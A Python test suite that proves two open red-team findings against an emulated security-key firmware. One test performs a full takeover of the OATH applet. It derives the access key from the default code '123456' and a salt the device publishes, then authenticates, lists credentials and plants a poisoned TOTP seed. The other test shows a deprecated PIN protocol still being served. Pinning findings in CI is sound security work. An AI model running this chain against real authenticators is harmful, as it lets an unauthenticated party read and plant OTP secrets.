"""Round-3 red-team proofs, automated on the emulation binary.

`tests/harness/test_redteam.py` (US-923) replays the *round-1* attacks as
refusals. The round-3 findings (``docs/archive/SECURITY-ASSESSMENT-ROUND3.md``,
remediation record alongside) left F4 and F8 **open** — documented decisions,
not regressions. This suite is the proof side: it *executes the exploit* and
asserts the finding's live behaviour, so the defect is demonstrated by CI on
every run rather than only by a hardware session.

Contract, stated up front because both tests assert the *open* state:

- While a finding is OPEN, the test asserts the vulnerable behaviour and
  FAILS LOUDLY if the behaviour disappears — not because failing is bad, but
  because the suite must never silently drift from the recorded finding.
  When the finding is fixed, the test body inverts into a refusal regression
  (the same way `test_redteam.py` pins the round-1 refusals) and this
  docstring gets a status line like the round-3 remediation table's.

- F6 (mgmt `INS_MIGRATION` oracle) and F5 (REBOOT enumeration) are
  hardware-leg-only here: the host build answers `INS_NOT_SUPPORTED` on
  migration by construction (`apps/mgmt/src/lib.rs:950`), and the REBOOT
  enumeration failure is a USB-physical phenomenon. The emulator cannot
  carry those proofs; `docs/audits/2026-11-05-redteam-attack-coverage.md`
  records the legs.

Cases:

==============  =====================================================
Case            Finding
==============  =====================================================
f4_takeover     F4 HIGH-latent — OATH default access code `123456`
                auto-provisioned at boot + PBKDF2 salt published in
                SELECT 0x71 → unauthenticated VALIDATE → LIST → PUT
                seed poisoning → CALC. Full compromise chain, run
                end-to-end here.
f8_protocol1    F8 LOW — deprecated pinUvAuth protocol 1 advertised in
                getInfo (key 0x06) AND answered by getKeyAgreement.
==============  =====================================================

Private ports (see the port map in ccid_relay.py): 36019/36020 CCID pair,
36123 HID — disjoint from every sibling suite and the shared harness pair.
"""
import hashlib
import hmac
import os
import struct
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "tests"))

from harness.test_restart import CcidEmu, Emu  # noqa: E402

RELAY_CCID_PORT = 36019
CCID_CLIENT_PORT = 36020
HID_PORT_F8 = 36123

OATH_AID = bytes.fromhex("A0000005272101")
TAG_NAME = 0x71
TAG_KEY = 0x73
TAG_CHALLENGE = 0x74
TAG_RESPONSE = 0x75
INS_PUT, INS_LIST, INS_CALC, INS_VALIDATE = 0x01, 0xA1, 0xA2, 0xA3
DEFAULT_ACCESS_CODE = b"123456"  # oath_core.rs:396 — the F4 fact
POISON_NAME = b"REDTEAM:poison"
POISON_KEY = bytes([0x21]) + bytes(range(20))  # TOTP/SHA1 type byte + secret

SW_OK = 0x9000
HOST = "127.0.0.1"


# --- tiny CBOR (harness has no cbor2 dependency; keep it that way) --------

def _cbor_skip(buf, i):
    """Return the index past the value starting at buf[i]."""
    ib = buf[i]
    mt, ai = ib >> 5, ib & 0x1F
    if ai < 24:
        ln, j = ai, i + 1
    elif ai == 24:
        ln, j = buf[i + 1], i + 2
    elif ai == 25:
        ln, j = struct.unpack(">H", buf[i + 1:i + 3])[0], i + 3
    elif ai == 26:
        ln, j = struct.unpack(">I", buf[i + 1:i + 5])[0], i + 5
    elif ai == 27:
        ln, j = struct.unpack(">Q", buf[i + 1:i + 9])[0], i + 9
    else:
        raise AssertionError(f"cbor indefinite/extra ai={ai}")
    if mt in (0, 1, 7):
        return j
    if mt == 2 or mt == 3:
        return j + ln
    if mt == 4:
        for _ in range(ln):          # array: one value per element
            j = _cbor_skip(buf, j)
        return j
    if mt == 5:
        for _ in range(ln):          # map: key + value per pair
            j = _cbor_skip(buf, j)
            j = _cbor_skip(buf, j)
        return j
    raise AssertionError(f"cbor mt={mt}")


def _getinfo_key(body, key):
    """Walk a top-level CBOR map; return the raw value bytes or None."""
    assert body[0] >> 5 == 5, "getInfo body is not a CBOR map"
    n = body[0] & 0x1F
    i = 1
    for _ in range(n):
        k = body[i]
        i = _cbor_skip(body, i)
        vstart = i
        i = _cbor_skip(body, i)
        if k == key:
            return body[vstart:i]
    return None


# --- F4: OATH default-access-code takeover --------------------------------

def _tlv(data, tag):
    i = 0
    while i + 2 <= len(data):
        t, ln = data[i], data[i + 1]
        if t == tag:
            return data[i + 2:i + 2 + ln]
        i += 2 + ln
    return None


@pytest.fixture()
def oath_client(tmp_path):
    emu = CcidEmu(
        {
            "keystore": tmp_path / "keystore",
            "partition": tmp_path / "partition.bin",
            "piv": tmp_path / "piv",
        },
        hid_port=HID_PORT_F8,
    )
    emu.start()
    try:
        yield emu.client
    finally:
        emu.stop()


def test_f4_default_access_code_takeover(oath_client):
    """F4 (OPEN): the published salt + the documented default code = takeover.

    Red evidence: SECURITY-ASSESSMENT-ROUND3.md F4 and
    `oath_core.rs:396/:1089/:2715` — the code auto-provisions
    `PBKDF2-HMAC-SHA1("123456", device_id, 1000, 16)` and SELECT publishes the
    salt as 0x71 unconditionally. This is the chain round 3 could not complete
    on the board (a real code was set); the emulator boots in exactly the
    default-code state, so the exploit is proven here end-to-end.
    """
    c = oath_client
    body, sw = c.apdu(0x00, 0xA4, 0x04, 0x00, OATH_AID)
    assert sw == SW_OK, f"SELECT failed: {sw:04X}"
    device_id = _tlv(body, TAG_NAME)
    challenge = _tlv(body, TAG_CHALLENGE)
    assert device_id is not None, (
        "SELECT published no 0x71 device-id — F4's salt publication is gone; "
        "invert this test into the refusal regression (see module docstring)"
    )
    assert challenge is not None and len(challenge) == 8, (
        "SELECT published no 0x74 challenge — no access code is provisioned; "
        "the default-code provisioning changed, invert this test"
    )

    # The exploit: derive the access key from the *published* salt and the
    # *publicly documented* code, and authenticate with it. Host proof is
    # HMAC over the DEVICE challenge (cmd_validate, oath_core.rs:2740);
    # the device MACs our host challenge back.
    key = hashlib.pbkdf2_hmac("sha1", DEFAULT_ACCESS_CODE, device_id, 1000, 16)
    host_challenge = os.urandom(8)
    proof = hmac.new(key, challenge, hashlib.sha1).digest()
    vbody = (bytes([TAG_CHALLENGE, 8]) + host_challenge
             + bytes([TAG_RESPONSE, len(proof)]) + proof)
    resp, sw = c.apdu(0x00, INS_VALIDATE, 0x00, 0x00, vbody)
    assert sw == SW_OK, (
        f"VALIDATE with the default code refused ({sw:04X}) — F4 fixed? "
        "invert this test into the refusal regression"
    )
    dev_mac = _tlv(resp, TAG_RESPONSE)
    assert dev_mac == hmac.new(key, host_challenge, hashlib.sha1).digest(), (
        "device MAC does not verify under the derived key — the takeover is "
        "not proven unless the mutual MAC closes"
    )

    # Authenticated: read the credential set, then poison one seed in.
    _, sw = c.apdu(0x00, INS_LIST, 0x00, 0x00, b"\x00")
    assert sw == SW_OK, f"LIST after takeover refused: {sw:04X}"
    put = (bytes([TAG_NAME, len(POISON_NAME)]) + POISON_NAME
           + bytes([TAG_KEY, len(POISON_KEY)]) + POISON_KEY)
    _, sw = c.apdu(0x00, INS_PUT, 0x00, 0x00, put)
    assert sw == SW_OK, f"PUT seed-poison refused: {sw:04X}"
    lr, sw = c.apdu(0x00, INS_LIST, 0x00, 0x00, b"\x00")
    assert sw == SW_OK and POISON_NAME in lr, "poison credential not visible"
    calc = (bytes([TAG_NAME, len(POISON_NAME)]) + POISON_NAME
            + bytes([TAG_CHALLENGE, 8]) + b"\x00" * 8)
    cr, sw = c.apdu(0x00, INS_CALC, 0x00, 0x00, calc)
    assert sw == SW_OK and len(cr) >= 20, (
        f"CALC of the poisoned seed refused/short: sw={sw:04X} len={len(cr)}"
    )
    # The chain is closed: an unauthenticated host minted a live OTP secret.
    # Cleanup so the emulator's private store doesn't carry the poison.
    c.apdu(0x00, 0x02, 0x00, 0x00, bytes([TAG_NAME, len(POISON_NAME)]) + POISON_NAME)


# --- F8: deprecated pinUvAuth protocol 1 ----------------------------------

def test_f8_pin_uv_auth_protocol_1(tmp_path):
    """F8 (OPEN): protocol 1 is advertised AND served.

    Red evidence: SECURITY-ASSESSMENT-ROUND3.md F8 — getInfo key 0x06 = [1, 2]
    (`ctap2.rs:839`), and both v1 and v2 getKeyAgreement answered within a
    session. Protocol 1 is the pre-2.1 HMAC construction without domain
    separation (Barbosa et al., ePrint 2025/459 shape).
    """
    emu = Emu(tmp_path / "keystore", hid_port=HID_PORT_F8)
    emu.start()
    try:
        resp = emu.ctap(0x04, b"")  # authenticatorGetInfo (python-fido2 dialect)
        assert resp[0] == 0x00, f"getInfo status {resp[0]:02X}"
        protocols_raw = _getinfo_key(resp[1:], 0x06)
        assert protocols_raw is not None, "getInfo has no key 0x06 pinUvAuthProtocols"
        mt, ai = protocols_raw[0] >> 5, protocols_raw[0] & 0x1F
        assert mt == 4, "0x06 value is not an array"
        n, i = ai, 1
        protocols = []
        for _ in range(n):
            p = protocols_raw[i]
            assert p >> 5 == 0, "protocol entries must be uints"
            protocols.append(p & 0x1F if p & 0x1F < 24 else -1)
            i = _cbor_skip(protocols_raw, i)
        assert 1 in protocols, (
            f"pinUvAuthProtocols {protocols} no longer contains 1 — F8 fixed; "
            "invert this test to assert 1 is refused"
        )

        # The stronger half: protocol 1 is not merely advertised, it answers.
        # clientPIN getKeyAgreement: {1: pinUvAuthProtocol, 2: 2} — fixed CBOR.
        resp = emu.ctap(0x06, b"\xA2\x01\x01\x02\x02")
        assert resp[0] == 0x00, (
            f"protocol-1 getKeyAgreement refused (0x{resp[0]:02X}) — F8 fixed; "
            "invert this test"
        )
        ka = _getinfo_key(resp[1:], 1)
        assert ka is not None, "getKeyAgreement returned no key-agreement map"
        x = _getinfo_key_map(ka, -2)
        assert x is not None and x[0] >> 5 == 2 and len(x) == 2 + 32, (
            "key-agreement COSE key has no 32-byte x coordinate"
        )
    finally:
        emu.stop()


def _getinfo_key_map(body, key):
    """Walk a CBOR map whose keys may be negative ints (COSE key)."""
    assert body[0] >> 5 == 5, "not a CBOR map"
    n = body[0] & 0x1F
    i = 1
    for _ in range(n):
        kbuf = body[i:i + _cbor_skip(body, i)]
        i2 = _cbor_skip(body, i)
        i = i2
        vstart = i
        i = _cbor_skip(body, i)
        kb = kbuf[0]
        if kb >> 5 in (0, 1):            # uint or negative-int key
            ai = kb & 0x1F
            if ai < 24:
                val = ai
            elif ai == 24 and len(kbuf) > 1:
                val = kbuf[1]
            else:
                val = -1
            k = -1 - val if kb >> 5 == 1 else val
            if k == key:
                return body[vstart:i]
    return None
